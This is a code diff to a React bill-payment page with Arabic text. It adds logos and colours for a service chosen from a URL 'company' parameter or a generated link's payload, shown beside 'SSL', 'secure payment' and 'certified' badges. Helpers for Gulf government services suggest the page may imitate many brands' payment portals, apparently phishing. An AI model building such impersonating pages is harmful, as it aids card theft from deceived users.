@@ -11,6 +11,7 @@ import { getGovernmentServicesByCountry } from "@/lib/gccGovernmentServices";
 import { getCurrencySymbol, getCurrencyCode, formatCurrency } from "@/lib/countryCurrencies";
 import PaymentMetaTags from "@/components/PaymentMetaTags";
 import { useLink, useUpdateLink } from "@/hooks/useSupabase";
+import { getServiceBranding } from "@/lib/serviceLogos";
 import { ArrowLeft, User, Mail, Phone, CreditCard, Hash, Shield, Lock, CheckCircle } from "lucide-react";
 
 const PaymentData = () => {
@@ -31,6 +32,7 @@ const PaymentData = () => {
   const serviceKey = urlParams.get('company') || linkData?.payload?.service_key || 'payment';
 
   const serviceName = "دفع فاتورة";
+  const branding = getServiceBranding(serviceKey);
   const paymentInfo = linkData?.payload as any;
 
   // Get country from link data
@@ -138,19 +140,34 @@ const PaymentData = () => {
 
         <div className="container mx-auto px-3 sm:px-4 -mt-8 sm:-mt-12 relative z-10">
           <div className="max-w-2xl mx-auto">
-            {/* Security Badges */}
-            <div className="mb-6 flex items-center justify-center gap-4 flex-wrap">
-              <div className="flex items-center gap-2 bg-white px-4 py-2 rounded-lg shadow-sm">
-                <Shield className="w-4 h-4 text-green-600" />
-                <span className="text-sm text-gray-700">تشفير SSL</span>
+            {/* Security Badges with Service Name */}
+            <div className="mb-6">
+              <div className="flex items-center justify-center gap-2 mb-3">
+                {branding?.logo && (
+                  <img
+                    src={branding.logo}
+                    alt={serviceName}
+                    className="h-8 w-auto"
+                    onError={(e) => e.currentTarget.style.display = 'none'}
+                  />
+                )}
+                <span className="text-lg font-bold" style={{ color: branding?.colors.primary || countryData?.primaryColor }}>
+                  {serviceName}
+                </span>
               </div>
-              <div className="flex items-center gap-2 bg-white px-4 py-2 rounded-lg shadow-sm">
-                <Lock className="w-4 h-4 text-green-600" />
-                <span className="text-sm text-gray-700">دفع آمن</span>
-              </div>
-              <div className="flex items-center gap-2 bg-white px-4 py-2 rounded-lg shadow-sm">
-                <CheckCircle className="w-4 h-4 text-green-600" />
-                <span className="text-sm text-gray-700">معتمد وموثوق</span>
+              <div className="flex items-center justify-center gap-3 flex-wrap">
+                <div className="flex items-center gap-2 bg-white px-3 py-2 rounded-lg shadow-sm border" style={{ borderColor: (branding?.colors.primary || countryData?.primaryColor) + '20' }}>
+                  <Shield className="w-4 h-4" style={{ color: branding?.colors.primary || countryData?.primaryColor }} />
+                  <span className="text-sm font-medium" style={{ color: branding?.colors.primary || countryData?.primaryColor }}>تشفير SSL</span>
+                </div>
+                <div className="flex items-center gap-2 bg-white px-3 py-2 rounded-lg shadow-sm border" style={{ borderColor: (branding?.colors.primary || countryData?.primaryColor) + '20' }}>
+                  <Lock className="w-4 h-4" style={{ color: branding?.colors.primary || countryData?.primaryColor }} />
+                  <span className="text-sm font-medium" style={{ color: branding?.colors.primary || countryData?.primaryColor }}>دفع آمن</span>
+                </div>
+                <div className="flex items-center gap-2 bg-white px-3 py-2 rounded-lg shadow-sm border" style={{ borderColor: (branding?.colors.primary || countryData?.primaryColor) + '20' }}>
+                  <CheckCircle className="w-4 h-4" style={{ color: branding?.colors.primary || countryData?.primaryColor }} />
+                  <span className="text-sm font-medium" style={{ color: branding?.colors.primary || countryData?.primaryColor }}>معتمد</span>
+                </div>
               </div>
             </div>
             <Card className="p-4 sm:p-8 shadow-2xl border-t-4" style={{ borderTopColor: countryData?.primaryColor }}>
